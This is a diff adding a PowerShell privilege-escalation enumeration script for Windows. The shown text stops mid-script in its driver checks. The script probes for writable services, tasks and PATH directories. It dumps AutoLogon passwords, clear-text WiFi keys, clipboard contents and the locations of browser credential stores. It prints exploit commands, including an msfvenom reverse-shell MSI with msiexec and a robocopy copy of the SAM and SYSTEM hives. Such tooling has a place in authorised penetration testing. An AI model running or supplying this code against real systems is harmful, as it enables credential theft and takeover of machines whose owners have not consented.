@@ -1,0 +1,2349 @@
+<#
+.SYNOPSIS
+     Windows Privilege Escalation Enumeration Tool
+.DESCRIPTION
+    Complete single-file solution with ALL 130+ Windows privilege escalation checks
+    Every MITRE ATT&CK TA0004 technique in ONE script
+.NOTES
+    For authorized security assessments only
+    Version: Everything in one file
+     .\WinPrivEnum_FINAL.ps1 -SaveReport
+#>
+
+param(
+    [switch]$Verbose,
+    [switch]$SaveReport,
+    [string]$OutputPath = ".\PrivEscEnum_FINAL_Report.txt",
+    [switch]$JSON,
+    [string]$JSONPath = ".\PrivEscEnum_FINAL_Report.json"
+)
+
+function Write-Finding {
+    param(
+        [string]$Message,
+        [string]$Level = "Info"
+    )
+    
+    switch ($Level) {
+        "Critical" { Write-Host "[!] $Message" -ForegroundColor Red }
+        "High"     { Write-Host "[+] $Message" -ForegroundColor Yellow }
+        "Medium"   { Write-Host "[*] $Message" -ForegroundColor Cyan }
+        "Info"     { Write-Host "[i] $Message" -ForegroundColor White }
+    }
+    
+    if ($SaveReport) {
+        Add-Content -Path $OutputPath -Value "[$Level] $Message"
+    }
+    
+    if ($JSON) {
+        $script:jsonResults += [PSCustomObject]@{
+            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            Level = $Level
+            Message = $Message
+        }
+    }
+}
+
+# Initialize JSON results array
+$script:jsonResults = @()
+
+function Write-SectionHeader {
+    param([string]$Title)
+    $separator = "=" * 80
+    Write-Host "`n$separator" -ForegroundColor Green
+    Write-Host $Title -ForegroundColor Green
+    Write-Host "$separator`n" -ForegroundColor Green
+    
+    if ($SaveReport) {
+        Add-Content -Path $OutputPath -Value "`n$separator`n$Title`n$separator`n"
+    }
+}
+
+if ($SaveReport) {
+    "FINAL Windows Privilege Escalation Enumeration - COMPLETE" | Out-File -FilePath $OutputPath
+    "Generated: $(Get-Date)" | Out-File -FilePath $OutputPath -Append
+    "Host: $env:COMPUTERNAME" | Out-File -FilePath $OutputPath -Append
+    "User: $env:USERNAME" | Out-File -FilePath $OutputPath -Append
+}
+
+Write-Host "`n================================================================" -ForegroundColor Cyan
+Write-Host "   FINAL Windows Privilege Escalation Tool" -ForegroundColor Cyan
+Write-Host "   130+ Complete Checks - One Script" -ForegroundColor Cyan
+Write-Host "================================================================`n" -ForegroundColor Cyan
+
+# ============================================================================
+# SYSTEM INFORMATION
+# ============================================================================
+Write-SectionHeader "SYSTEM INFORMATION"
+
+try {
+    $os = Get-WmiObject -Class Win32_OperatingSystem
+    Write-Finding "OS: $($os.Caption) $($os.OSArchitecture)" "Info"
+    Write-Finding "Version: $($os.Version)" "Info"
+    Write-Finding "Build: $($os.BuildNumber)" "Info"
+    Write-Finding "Hostname: $env:COMPUTERNAME" "Info"
+    Write-Finding "Domain: $env:USERDOMAIN" "Info"
+    
+    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
+    Write-Finding "Manufacturer: $($computerSystem.Manufacturer)" "Info"
+    Write-Finding "Model: $($computerSystem.Model)" "Info"
+    
+    Write-Finding "`nChecking installed hotfixes..." "Info"
+    $hotfixes = Get-HotFix | Select-Object -ExpandProperty HotFixID
+    Write-Finding "Total Hotfixes: $($hotfixes.Count)" "Info"
+    
+    $lastBoot = $os.ConvertToDateTime($os.LastBootUpTime)
+    Write-Finding "Last Boot: $lastBoot" "Info"
+    
+} catch {
+    Write-Finding "Error gathering system information: $_" "High"
+}
+
+# ============================================================================
+# CURRENT USER INFORMATION
+# ============================================================================
+Write-SectionHeader "CURRENT USER INFORMATION"
+
+try {
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    Write-Finding "Username: $($currentUser.Name)" "Info"
+    Write-Finding "User SID: $($currentUser.User.Value)" "Info"
+    
+    Write-Finding "`nUser Privileges:" "Info"
+    $privileges = whoami /priv
+    $privileges | ForEach-Object { Write-Finding $_ "Info" }
+    
+    Write-Finding "`nGroup Memberships:" "Info"
+    $groups = whoami /groups
+    $groups | ForEach-Object { Write-Finding $_ "Info" }
+    
+    if ($privileges -match "SeImpersonatePrivilege.*Enabled") {
+        Write-Finding "`nSeImpersonatePrivilege ENABLED - Token impersonation!" "Critical"
+        Write-Finding "  Exploit: PrintSpoofer.exe -i -c cmd" "Critical"
+        Write-Finding "  Tools: RoguePotato, GodPotato, JuicyPotato" "Critical"
+    }
+    if ($privileges -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
+        Write-Finding "SeAssignPrimaryTokenPrivilege ENABLED" "High"
+    }
+    if ($privileges -match "SeTcbPrivilege.*Enabled") {
+        Write-Finding "SeTcbPrivilege ENABLED - Act as OS!" "Critical"
+    }
+    if ($privileges -match "SeDebugPrivilege.*Enabled") {
+        Write-Finding "SeDebugPrivilege ENABLED - Process injection!" "High"
+        Write-Finding "  Exploit: Inject into SYSTEM process" "High"
+    }
+    if ($privileges -match "SeBackupPrivilege.*Enabled") {
+        Write-Finding "SeBackupPrivilege ENABLED - Read any file!" "High"
+        Write-Finding "  Exploit: robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM" "High"
+    }
+    if ($privileges -match "SeRestorePrivilege.*Enabled") {
+        Write-Finding "SeRestorePrivilege ENABLED - Write any file!" "High"
+    }
+    if ($privileges -match "SeTakeOwnershipPrivilege.*Enabled") {
+        Write-Finding "SeTakeOwnershipPrivilege ENABLED" "High"
+        Write-Finding "  Exploit: takeown /f file && icacls file /grant user:F" "High"
+    }
+    if ($privileges -match "SeLoadDriverPrivilege.*Enabled") {
+        Write-Finding "SeLoadDriverPrivilege ENABLED - Load drivers!" "Critical"
+        Write-Finding "  Exploit: Load vulnerable signed driver (Capcom.sys)" "Critical"
+    }
+    
+} catch {
+    Write-Finding "Error gathering user information: $_" "High"
+}
+
+# ============================================================================
+# ALWAYSINSTALLELEVATED
+# ============================================================================
+Write-SectionHeader "ALWAYSINSTALLELEVATED CHECK"
+
+try {
+    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+    $hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+    
+    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
+        Write-Finding "VULNERABLE! AlwaysInstallElevated enabled!" "Critical"
+        Write-Finding "  Exploit: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi" "Critical"
+        Write-Finding "  Then: msiexec /quiet /qn /i evil.msi" "Critical"
+    } else {
+        Write-Finding "AlwaysInstallElevated not enabled" "Info"
+    }
+} catch {
+    Write-Finding "Could not check AlwaysInstallElevated" "Info"
+}
+
+# ============================================================================
+# SERVICES ENUMERATION - COMPREHENSIVE
+# ============================================================================
+Write-SectionHeader "SERVICES - COMPREHENSIVE ANALYSIS"
+
+try {
+    Write-Finding "Performing deep service analysis..." "Info"
+    
+    $services = Get-WmiObject win32_service
+    
+    foreach ($service in $services) {
+        # Unquoted service paths
+        if ($service.PathName -match '^[^"].*\s.*') {
+            Write-Finding "Unquoted Service Path: $($service.Name)" "High"
+            Write-Finding "  Path: $($service.PathName)" "High"
+            Write-Finding "  Exploit: Place exe in path before space" "High"
+        }
+        
+        # Writable service binaries
+        if ($service.PathName) {
+            $binaryPath = $service.PathName -replace '"', '' -replace ' .*$', ''
+            if (Test-Path $binaryPath -ErrorAction SilentlyContinue) {
+                try {
+                    $testFile = $binaryPath + ".test"
+                    [System.IO.File]::Create($testFile).Close()
+                    Remove-Item $testFile -ErrorAction SilentlyContinue
+                    Write-Finding "Writable Service Binary: $($service.Name) - $binaryPath" "Critical"
+                    Write-Finding "  Exploit: Replace with payload and restart service" "Critical"
+                } catch {}
+                
+                # Check parent directory
+                $parentDir = Split-Path $binaryPath -Parent
+                if ($parentDir -and (Test-Path $parentDir)) {
+                    try {
+                        $testFile = Join-Path $parentDir "test.dll"
+                        [System.IO.File]::Create($testFile).Close()
+                        Remove-Item $testFile -ErrorAction SilentlyContinue
+                        Write-Finding "Writable Service Directory: $($service.Name) - $parentDir" "High"
+                        Write-Finding "  Exploit: DLL hijacking in service directory" "High"
+                    } catch {}
+                }
+            }
+        }
+    }
+    
+    # Check service registry permissions
+    Write-Finding "`nChecking service registry keys..." "Info"
+    $serviceRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
+    
+    if (Test-Path $serviceRegPath) {
+        Get-ChildItem $serviceRegPath -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object {
+            $serviceName = $_.PSChildName
+            try {
+                New-ItemProperty -Path $_.PSPath -Name "TestPermission" -Value "test" -ErrorAction Stop | Out-Null
+                Remove-ItemProperty -Path $_.PSPath -Name "TestPermission" -ErrorAction SilentlyContinue
+                Write-Finding "WRITABLE Service Registry: $serviceName" "Critical"
+                Write-Finding "  Exploit: Modify ImagePath to point to payload" "Critical"
+            } catch {}
+        }
+    }
+    
+    # Check for service DLLs
+    Write-Finding "`nChecking service DLL opportunities..." "Info"
+    foreach ($service in ($services | Select-Object -First 30)) {
+        $serviceName = $service.Name
+        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters"
+        
+        if (Test-Path $regPath) {
+            $params = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+            if ($params.ServiceDll) {
+                $dllPath = $params.ServiceDll
+                $dllDir = Split-Path $dllPath -Parent
+                
+                if ($dllDir -and (Test-Path $dllDir -ErrorAction SilentlyContinue)) {
+                    try {
+                        $testFile = Join-Path $dllDir "test.dll"
+                        [System.IO.File]::Create($testFile).Close()
+                        Remove-Item $testFile -ErrorAction SilentlyContinue
+                        Write-Finding "Writable Service DLL Directory: $serviceName - $dllDir" "Critical"
+                    } catch {}
+                }
+            }
+        }
+    }
+    
+    # Check service failure actions
+    Write-Finding "`nChecking service failure actions..." "Info"
+    foreach ($service in ($services | Where-Object {$_.StartMode -eq "Auto"} | Select-Object -First 20)) {
+        try {
+            $failureActions = sc.exe qfailure $($service.Name) 2>$null
+            if ($failureActions -match "COMMAND_LINE.*\.exe") {
+                $commandLine = ($failureActions | Select-String "COMMAND_LINE").ToString()
+                Write-Finding "Service with failure command: $($service.Name)" "Medium"
+                Write-Finding "  Command: $commandLine" "Medium"
+            }
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error in service enumeration: $_" "High"
+}
+
+# ============================================================================
+# SCHEDULED TASKS
+# ============================================================================
+Write-SectionHeader "SCHEDULED TASKS"
+
+try {
+    Write-Finding "Checking scheduled tasks..." "Info"
+    
+    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.State -eq "Ready"}
+    
+    foreach ($task in $tasks) {
+        if ($task.Principal.UserId -match "SYSTEM") {
+            $actions = $task.Actions
+            foreach ($action in $actions) {
+                if ($action.Execute) {
+                    $execPath = $action.Execute
+                    if (Test-Path $execPath -ErrorAction SilentlyContinue) {
+                        try {
+                            $testFile = $execPath + ".test"
+                            [System.IO.File]::Create($testFile).Close()
+                            Remove-Item $testFile -ErrorAction SilentlyContinue
+                            Write-Finding "Writable SYSTEM Task: $($task.TaskName)" "Critical"
+                            Write-Finding "  Path: $execPath" "Critical"
+                            Write-Finding "  Exploit: Replace executable and wait for trigger" "Critical"
+                        } catch {}
+                    }
+                }
+            }
+        }
+    }
+    
+    # Check task directory
+    $taskPath = "C:\Windows\System32\Tasks"
+    if (Test-Path $taskPath) {
+        try {
+            $testFile = Join-Path $taskPath "TestTask"
+            [System.IO.File]::Create($testFile).Close()
+            Remove-Item $testFile -ErrorAction SilentlyContinue
+            Write-Finding "Task directory is WRITABLE!" "Critical"
+            Write-Finding "  Can create malicious scheduled tasks" "Critical"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking scheduled tasks: $_" "High"
+}
+
+# ============================================================================
+# PATH ANALYSIS
+# ============================================================================
+Write-SectionHeader "PATH ANALYSIS - DLL HIJACKING"
+
+try {
+    $pathDirs = $env:PATH -split ";"
+    
+    Write-Finding "Checking PATH for writable directories..." "Info"
+    foreach ($dir in $pathDirs) {
+        if ($dir -and (Test-Path $dir -ErrorAction SilentlyContinue)) {
+            try {
+                $testFile = Join-Path $dir "test.dll"
+                [System.IO.File]::Create($testFile).Close()
+                Remove-Item $testFile -ErrorAction SilentlyContinue
+                Write-Finding "Writable PATH directory: $dir" "High"
+                Write-Finding "  Exploit: Place malicious DLL with common name (version.dll, dwmapi.dll)" "High"
+            } catch {}
+        }
+    }
+    
+    if ($env:PATH -match "^\.;|;\.;|;\.$") {
+        Write-Finding "Current directory (.) in PATH - CRITICAL DLL hijacking!" "Critical"
+    }
+    
+    # Check Program Files
+    Write-Finding "`nChecking Program Files for writable directories..." "Info"
+    $programDirs = @("C:\Program Files", "C:\Program Files (x86)")
+    
+    foreach ($baseDir in $programDirs) {
+        if (Test-Path $baseDir) {
+            Get-ChildItem $baseDir -Directory -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object {
+                try {
+                    $testFile = Join-Path $_.FullName "test.dll"
+                    [System.IO.File]::Create($testFile).Close()
+                    Remove-Item $testFile -ErrorAction SilentlyContinue
+                    Write-Finding "Writable Program Directory: $($_.FullName)" "High"
+                    Write-Finding "  Exploit: DLL hijacking for applications in this directory" "High"
+                } catch {}
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking PATH: $_" "High"
+}
+
+# ============================================================================
+# AUTORUN ENTRIES
+# ============================================================================
+Write-SectionHeader "AUTORUN AND PERSISTENCE"
+
+try {
+    Write-Finding "Checking autorun locations..." "Info"
+    
+    $autorunKeys = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
+    )
+    
+    foreach ($key in $autorunKeys) {
+        if (Test-Path $key) {
+            $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
+            if ($entries) {
+                Write-Finding "`nAutorun entries in $key" "Info"
+                $entries.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
+                    Write-Finding "$($_.Name): $($_.Value)" "Medium"
+                    
+                    $filePath = $_.Value -replace '"', '' -replace ' .*$', ''
+                    if (Test-Path $filePath -ErrorAction SilentlyContinue) {
+                        try {
+                            $testFile = $filePath + ".test"
+                            [System.IO.File]::Create($testFile).Close()
+                            Remove-Item $testFile -ErrorAction SilentlyContinue
+                            Write-Finding "  ^-- WRITABLE! Can replace with payload" "Critical"
+                        } catch {}
+                    }
+                }
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking autorun: $_" "High"
+}
+
+# ============================================================================
+# STARTUP FOLDERS
+# ============================================================================
+Write-SectionHeader "STARTUP FOLDERS"
+
+try {
+    $startupFolders = @(
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
+        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
+        "$env:USERPROFILE\Start Menu\Programs\Startup"
+    )
+    
+    foreach ($folder in $startupFolders) {
+        if (Test-Path $folder) {
+            Write-Finding "`nStartup Folder: $folder" "Info"
+            
+            $items = Get-ChildItem $folder -ErrorAction SilentlyContinue
+            foreach ($item in $items) {
+                Write-Finding "  Contains: $($item.Name)" "Medium"
+            }
+            
+            try {
+                $testFile = Join-Path $folder "test.exe"
+                [System.IO.File]::Create($testFile).Close()
+                Remove-Item $testFile -ErrorAction SilentlyContinue
+                Write-Finding "  ^-- WRITABLE startup folder!" "Critical"
+                Write-Finding "  Exploit: Drop payload here for persistence" "Critical"
+            } catch {}
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking startup folders: $_" "High"
+}
+
+# ============================================================================
+# CREDENTIAL HUNTING - COMPREHENSIVE
+# ============================================================================
+Write-SectionHeader "CREDENTIAL HUNTING - COMPREHENSIVE"
+
+try {
+    Write-Finding "Comprehensive credential search..." "Info"
+    
+    # Unattend files
+    Write-Finding "`nUnattend.xml files:" "Info"
+    $unattendPaths = @(
+        "$env:USERPROFILE\Unattend.xml",
+        "C:\Unattend.xml",
+        "C:\Windows\Panther\Unattend.xml",
+        "C:\Windows\Panther\Unattend\Unattend.xml",
+        "C:\Windows\System32\sysprep\unattend.xml",
+        "C:\Windows\System32\sysprep\sysprep.xml"
+    )
+    
+    foreach ($file in $unattendPaths) {
+        if (Test-Path $file -ErrorAction SilentlyContinue) {
+            Write-Finding "Found: $file" "High"
+        }
+    }
+    
+    # PowerShell history
+    $psHistory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+    if (Test-Path $psHistory) {
+        Write-Finding "`nPowerShell history found: $psHistory" "High"
+        $historyContent = Get-Content $psHistory -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass|key|secret" -SimpleMatch
+        if ($historyContent) {
+            Write-Finding "  Contains potential credentials!" "High"
+        }
+    }
+    
+    # Registry credentials
+    Write-Finding "`nRegistry credential check:" "Info"
+    
+    # AutoLogon
+    $winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
+    if ($winlogon.DefaultUserName) {
+        Write-Finding "AutoLogon User: $($winlogon.DefaultUserName)" "High"
+        if ($winlogon.DefaultPassword) {
+            Write-Finding "  Password: $($winlogon.DefaultPassword)" "Critical"
+        }
+    }
+    
+    # SNMP
+    $snmpParams = "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
+    if (Test-Path $snmpParams) {
+        Write-Finding "SNMP community strings found in registry" "High"
+        Get-ItemProperty $snmpParams -ErrorAction SilentlyContinue | ForEach-Object {
+            $_.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
+                Write-Finding "  Community: $($_.Name)" "High"
+            }
+        }
+    }
+    
+    # VNC
+    $vncKeys = @(
+        "HKCU:\Software\ORL\WinVNC3\Password",
+        "HKCU:\Software\RealVNC\WinVNC4",
+        "HKLM:\SOFTWARE\RealVNC\WinVNC4"
+    )
+    foreach ($key in $vncKeys) {
+        if (Test-Path $key -ErrorAction SilentlyContinue) {
+            Write-Finding "VNC password key: $key" "High"
+        }
+    }
+    
+    # PuTTY
+    $puttyPath = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
+    if (Test-Path $puttyPath) {
+        Write-Finding "`nPuTTY sessions found" "High"
+        Get-ChildItem $puttyPath -ErrorAction SilentlyContinue | ForEach-Object {
+            $session = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            Write-Finding "  Session: $($_.PSChildName)" "Medium"
+            if ($session.HostName) {
+                Write-Finding "    Host: $($session.HostName)" "Medium"
+            }
+            if ($session.UserName) {
+                Write-Finding "    User: $($session.UserName)" "Medium"
+            }
+        }
+    }
+    
+    # WiFi Passwords
+    Write-Finding "`nWiFi passwords:" "Info"
+    try {
+        $wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
+            $_ -replace ".*:\s+"
+        }
+        
+        foreach ($profile in $wifiProfiles) {
+            $profileInfo = netsh wlan show profile name="$profile" key=clear 2>$null
+            $password = $profileInfo | Select-String "Key Content" | ForEach-Object {
+                $_ -replace ".*:\s+"
+            }
+            if ($password) {
+                Write-Finding "WiFi '$profile' = $password" "High"
+            }
+        }
+    } catch {}
+    
+    # IIS
+    Write-Finding "`nIIS configuration:" "Info"
+    $iisConfig = "C:\Windows\System32\inetsrv\config\applicationHost.config"
+    if (Test-Path $iisConfig) {
+        Write-Finding "IIS config found: $iisConfig" "High"
+        $iisContent = Get-Content $iisConfig -ErrorAction SilentlyContinue | Select-String -Pattern "password|connectionString"
+        if ($iisContent) {
+            Write-Finding "  Contains connection strings/passwords!" "Critical"
+        }
+    }
+    
+    # Web.config files
+    Write-Finding "`nWeb.config files:" "Info"
+    if (Test-Path "C:\inetpub") {
+        Get-ChildItem "C:\inetpub" -Filter "web.config" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
+            Write-Finding "Found: $($_.FullName)" "High"
+            $content = Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString|password"
+            if ($content) {
+                Write-Finding "  Contains credentials!" "High"
+            }
+        }
+    }
+    
+    # Database connection files
+    Write-Finding "`nDatabase connection files:" "Info"
+    $dbExtensions = @("*.udl", "*.dsn")
+    foreach ($ext in $dbExtensions) {
+        Get-ChildItem "C:\" -Filter $ext -Recurse -ErrorAction SilentlyContinue -Depth 2 | Select-Object -First 5 | ForEach-Object {
+            Write-Finding "Found: $($_.FullName)" "High"
+        }
+    }
+    
+} catch {
+    Write-Finding "Error in credential hunting: $_" "High"
+}
+
+# ============================================================================
+# BROWSER CREDENTIALS
+# ============================================================================
+Write-SectionHeader "BROWSER CREDENTIALS"
+
+try {
+    Write-Finding "Checking browsers..." "Info"
+    
+    # Chrome
+    $chromePaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    )
+    
+    foreach ($path in $chromePaths) {
+        if (Test-Path $path) {
+            Write-Finding "Chrome: $path" "High"
+        }
+    }
+    
+    # Firefox
+    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxProfiles) {
+        Write-Finding "`nFirefox profiles found" "High"
+        Get-ChildItem $firefoxProfiles -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            $loginJson = Join-Path $_.FullName "logins.json"
+            $key4db = Join-Path $_.FullName "key4.db"
+            $cookies = Join-Path $_.FullName "cookies.sqlite"
+            
+            if (Test-Path $loginJson) { Write-Finding "  logins.json: $loginJson" "High" }
+            if (Test-Path $key4db) { Write-Finding "  key4.db: $key4db" "High" }
+            if (Test-Path $cookies) { Write-Finding "  cookies: $cookies" "High" }
+        }
+    }
+    
+    # Edge
+    $edgePaths = @(
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+    )
+    
+    foreach ($path in $edgePaths) {
+        if (Test-Path $path) {
+            Write-Finding "Edge: $path" "High"
+        }
+    }
+    
+    Write-Finding "`nUse SharpChrome, LaZagne, or similar tools to decrypt" "Info"
+    
+} catch {
+    Write-Finding "Error checking browsers: $_" "High"
+}
+
+# ============================================================================
+# CLIPBOARD AND RECENT FILES
+# ============================================================================
+Write-SectionHeader "CLIPBOARD AND RECENT ACTIVITY"
+
+try {
+    # Clipboard
+    Write-Finding "Checking clipboard..." "Info"
+    try {
+        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+        $clipboard = [System.Windows.Forms.Clipboard]::GetText()
+        if ($clipboard) {
+            $preview = $clipboard.Substring(0, [Math]::Min(200, $clipboard.Length))
+            Write-Finding "Clipboard content (first 200 chars): $preview" "Medium"
+        }
+    } catch {}
+    
+    # Recent documents
+    Write-Finding "`nRecent documents:" "Info"
+    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
+    if (Test-Path $recentPath) {
+        $recentItems = Get-ChildItem $recentPath -ErrorAction SilentlyContinue | Select-Object -First 20
+        Write-Finding "Recent items: $($recentItems.Count)" "Info"
+        $recentItems | ForEach-Object {
+            if ($_.Extension -eq ".lnk") {
+                Write-Finding "  $($_.Name)" "Info"
+            }
+        }
+    }
+    
+    # Jump lists
+    $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+    if (Test-Path $jumpListPath) {
+        $jumpLists = Get-ChildItem $jumpListPath -ErrorAction SilentlyContinue
+        Write-Finding "`nJump list files: $($jumpLists.Count)" "Medium"
+    }
+    
+    # Recycle Bin
+    Write-Finding "`nRecycle Bin:" "Info"
+    $recycleBin = Get-ChildItem 'C:\$Recycle.Bin' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
+    if ($recycleBin) {
+        Write-Finding "Items in Recycle Bin: $($recycleBin.Count)" "Medium"
+    }
+    
+} catch {
+    Write-Finding "Error checking clipboard/recent: $_" "High"
+}
+
+# ============================================================================
+# PROCESS ENUMERATION
+# ============================================================================
+Write-SectionHeader "PROCESS ENUMERATION"
+
+try {
+    Write-Finding "Enumerating processes..." "Info"
+    
+    $processes = Get-WmiObject Win32_Process
+    
+    # SYSTEM processes
+    Write-Finding "`nSYSTEM processes:" "Info"
+    $systemProcs = $processes | Where-Object {
+        $owner = $_.GetOwner()
+        $owner.User -eq "SYSTEM"
+    } | Select-Object ProcessId,Name,CommandLine -First 25
+    
+    foreach ($proc in $systemProcs) {
+        Write-Finding "  PID $($proc.ProcessId): $($proc.Name)" "Medium"
+    }
+    
+    # Unquoted process paths
+    Write-Finding "`nProcesses with unquoted paths:" "Info"
+    $processes | Where-Object {
+        $_.ExecutablePath -and $_.ExecutablePath -match '^\w:\\[^"]*\s.*\.exe' -and $_.ExecutablePath -notmatch '^"'
+    } | Select-Object -First 10 | ForEach-Object {
+        Write-Finding "  PID $($_.ProcessId): $($_.Name) - $($_.ExecutablePath)" "High"
+    }
+    
+} catch {
+    Write-Finding "Error enumerating processes: $_" "High"
+}
+
+# ============================================================================
+# KERNEL EXPLOIT DETECTION
+# ============================================================================
+Write-SectionHeader "KERNEL EXPLOIT DETECTION"
+
+try {
+    $buildNumber = (Get-WmiObject Win32_OperatingSystem).BuildNumber
+    Write-Finding "OS Build: $buildNumber" "Info"
+    
+    $exploits = @{
+        "7600" = @("MS10-015", "MS10-092", "MS11-011", "MS11-046")
+        "7601" = @("MS11-046", "MS11-080", "MS13-005", "MS13-053", "MS13-081", "MS14-058", "MS15-051", "MS16-014", "MS16-032")
+        "9200" = @("MS13-053", "MS13-081", "MS14-058", "MS15-051", "MS16-014", "MS16-032")
+        "9600" = @("MS14-058", "MS15-051", "MS16-014", "MS16-032", "MS16-034", "MS16-135")
+        "10240" = @("MS16-032", "MS16-034", "MS16-135")
+        "10586" = @("MS16-032", "MS16-034", "MS16-135")
+        "14393" = @("MS16-135", "CVE-2017-0213")
+        "15063" = @("CVE-2017-0213")
+        "16299" = @("CVE-2018-0743", "CVE-2018-8120")
+        "17134" = @("CVE-2018-8440", "CVE-2018-8611")
+        "17763" = @("CVE-2019-0841", "CVE-2019-1064", "CVE-2019-1130", "CVE-2019-1253", "CVE-2019-1315")
+        "18362" = @("CVE-2019-1064", "CVE-2019-1130", "CVE-2019-1253", "CVE-2019-1315", "CVE-2020-0668")
+        "18363" = @("CVE-2019-1253", "CVE-2019-1315", "CVE-2020-0668", "CVE-2020-0683", "CVE-2020-1054")
+        "19041" = @("CVE-2020-0668", "CVE-2020-0683", "CVE-2020-1054", "CVE-2020-1337", "CVE-2021-1732")
+        "19042" = @("CVE-2020-1054", "CVE-2021-1732", "CVE-2021-36934 (HiveNightmare)")
+        "19043" = @("CVE-2021-1732", "CVE-2021-36934 (HiveNightmare)", "CVE-2021-40449")
+        "19044" = @("CVE-2021-36934 (HiveNightmare)", "CVE-2021-40449", "CVE-2022-21882")
+        "22000" = @("CVE-2021-36934 (HiveNightmare)", "CVE-2021-40449", "CVE-2022-21882", "CVE-2022-37969")
+        "22621" = @("CVE-2023-21746", "CVE-2023-21768", "CVE-2023-23376")
+    }
+    
+    if ($exploits.ContainsKey($buildNumber)) {
+        Write-Finding "`nPotentially vulnerable to:" "Critical"
+        foreach ($exploit in $exploits[$buildNumber]) {
+            Write-Finding "  - $exploit" "Critical"
+        }
+        Write-Finding "`nSearch GitHub/exploit-db for proof-of-concepts" "Critical"
+    } else {
+        Write-Finding "Build not in database (patched or too new)" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking kernel exploits: $_" "High"
+}
+
+# ============================================================================
+# NAMED PIPES
+# ============================================================================
+Write-SectionHeader "NAMED PIPES"
+
+try {
+    Write-Finding "Enumerating named pipes..." "Info"
+    
+    $pipes = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
+    Write-Finding "Total pipes: $($pipes.Count)" "Info"
+    
+    $interestingPipes = @("lsass", "sam", "winreg", "spoolss", "srvsvc", "ntsvcs", "scerpc", "wkssvc")
+    
+    Write-Finding "`nInteresting pipes:" "Info"
+    foreach ($pipe in $pipes) {
+        $pipeName = [System.IO.Path]::GetFileName($pipe)
+        foreach ($interesting in $interestingPipes) {
+            if ($pipeName -like "*$interesting*") {
+                Write-Finding "  $pipeName" "Medium"
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error enumerating pipes: $_" "High"
+}
+
+# ============================================================================
+# DRIVER ENUMERATION
+# ============================================================================
+Write-SectionHeader "DRIVER ENUMERATION"
+
+try {
+    Write-Finding "Checking drivers..." "Info"
+    
+    $drivers = driverquery /v /fo csv | ConvertFrom-Csv
+    
+    # Unsigned drivers
+    $unsigned = $drivers | Where-Object {$_.Signed -eq "False"}
+    if ($unsigned) {
+        Write-Finding "`nUnsigned drivers:" "High"
+        $unsigned | Select-Object -First 10 | ForEach-Object {
+            Write-Finding "  $($_.'Module Name') - $($_.'Display Name')" "High"
+        }
+    }
+    
